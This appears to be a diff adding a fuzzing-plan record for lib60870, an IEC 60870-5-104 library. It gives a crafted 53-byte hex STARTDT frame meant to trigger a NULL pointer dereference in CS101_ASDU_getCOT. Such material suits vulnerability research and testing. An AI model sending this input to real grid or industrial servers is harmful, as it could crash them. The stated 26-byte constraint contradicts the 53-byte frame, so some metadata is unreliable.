@@ -1,0 +1,58 @@
+{
+  "plan_id": "vk-plan-055",
+  "seed_id": "vk_seed_55_001",
+  "title": "VK-only STARTDT activation: lib60870 v2.1.1 contains a NULL pointer dereference in `CS101_ASDU_...",
+  "strategy": "issue_structural_analogue",
+  "target_operation": "STARTDT activation",
+  "purpose": "Combine the issue-supported vulnerable structure with a conservative model-prior protocol form without copying the crash payload.",
+  "evidence_ids": [
+    "issue:175:175-summary:1d1910f22105",
+    "issue:178:178-summary:01c5b607cf00",
+    "issue:53:53-summary:9148432dbf39",
+    "issue:200:200-summary:348db1f37fe8",
+    "issue:201:201-summary:798beefc9cab"
+  ],
+  "messages": [
+    {
+      "index": 0,
+      "direction": "client_to_server",
+      "label": "startdt",
+      "hex": "68330f00000000000000000000008300fa000000008300fa00e26808000000008300fa00e2eb0080000000000001000083000483f0",
+      "byte_length": 53,
+      "sha256": "0532b87c43312146c61455e60d2288d9ea2973bad49a044e136042331e167bd2"
+    }
+  ],
+  "expected_behavior": "Model-prior server processes STARTDT with structure analogous to NULL self dereference in CS101_ASDU_getCOT (issue:175)",
+  "constraints_preserved": [
+    "0x68 length octet consistent with 26-byte frame",
+    "FT1.1 APCI header preserved",
+    "TypeID 104 with sequence-bit set, VSQ=1, COT=0",
+    "Sequence-form IOA structure respected",
+    "Single-request shape"
+  ],
+  "issue_safety_notes": "Combined vulnerable structure without copying any crash payload from issues 175/201",
+  "sequence_sha256": "23f2003beda3da1cb91023af87b08b6d2a8b5a3e6591c783519fa5ec81f4a58a",
+  "total_bytes": 53,
+  "message_count_hint": 1,
+  "repair_notes": [],
+  "exact_issue_collision": false,
+  "plan_issue_refs": [
+    "175"
+  ],
+  "_selection_score": 106.0,
+  "export": {
+    "sequence_encoding": "raw-binary-concat",
+    "sequence_file": "sequence.bin",
+    "encoded_sha256": "0532b87c43312146c61455e60d2288d9ea2973bad49a044e136042331e167bd2",
+    "encoded_bytes": 53,
+    "frames": [
+      {
+        "message_index": 0,
+        "frame_offset": 0,
+        "payload_offset": 0,
+        "payload_length": 53,
+        "frame_length": 53
+      }
+    ]
+  }
+}
